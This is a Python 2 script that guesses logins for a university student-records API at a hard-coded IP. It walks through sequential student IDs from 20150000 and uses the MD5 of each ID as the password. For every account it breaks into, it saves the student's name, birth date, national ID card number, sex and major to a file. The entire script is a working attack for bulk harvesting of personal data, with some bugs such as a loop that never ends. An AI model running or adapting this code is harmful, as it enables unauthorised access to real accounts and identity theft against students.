#!/usr/bin/env python
# coding=utf-8


import sys,time
reload(sys)
sys.setdefaultencoding( "utf-8" )
import json
z=''
def md5(str):
    import hashlib
    m = hashlib.md5()
    m.update(str)
    return m.hexdigest()

def ran():
    import random
    return str(random.randint(1000000000000000000, 2999999999999999999))

def WebView(urls):
    import urllib2
    # request=urllib2.Request(urls)
    web=urllib2.urlopen(urls)
    return web.read().decode('gbk').encode('utf-8')
def infor(token):
    global z
    url="http://202.118.31.241:8080/api/v1/schoolRoll?token="+token
    i = WebView(url)
    JsonI = json.loads(i)
    print JsonI['data'][0]['birth'],JsonI['data'][0]['idCard'],JsonI['data'][0]['professionName'],JsonI['data'][0]['sex'],JsonI['data'][0]['StudentName'],
    filehandler.write('"birth":"'+JsonI['data'][0]['birth']+'",'+' '+'"idcard":"'+JsonI['data'][0]['idCard']+'",'+'"major":"'+JsonI['data'][0]['professionName']+'",'+'"sex":"'+JsonI['data'][0]['sex']+'",'+'"name":"'+JsonI['data'][0]['StudentName']+'"},')
    # z=z+'"birth":"'+JsonI['data'][0]['birth']+'",'+' '+'"idcard":"'+JsonI['data'][0]['idCard']+'",'+'"major":"'+JsonI['data'][0]['professionName']+'",'+'"sex":"'+JsonI['data'][0]['sex']+'",'+'"name":"'+JsonI['data'][0]['StudentName']+'"},'
def code(name):
    global z
    userName = name
    passwd = md5(name)
    url = "http://202.118.31.241:8080/api/v1/login?userName="+userName+"&passwd="+passwd+"&token"+ran()
    print url
    Login = WebView(url)
    JsonLogin = json.loads(Login)
    if JsonLogin['success']=='0':
        filehandler.write('{"id":"'+name+'",')
        z=z+'{"id":"'+name+'",'
        infor(JsonLogin['data']['token'])
        return 0
    else:
        return -1
filehandler = open('liuxuesheng.txt','w')
filehandler.write('{"data":[')
filehandler.close()
filehandler = open('liuxuesheng.txt','a')
n = 20150000
r =0
while True:
    s = str("%08d"%(n))
    print "\n"+s,
    n= n+1
    if code(s)==0:
        r =r+1
    if n==20150000:
        print r
        break
filehandler.close()

filehandler = open('liuxuesheng.txt','r')
a = filehandler.read()
a = a[:-1]
filehandler.close()

filehandler = open('liuxuesheng.txt','w')
filehandler.write(a+']}')
filehandler.write(']}')
filehandler.close()
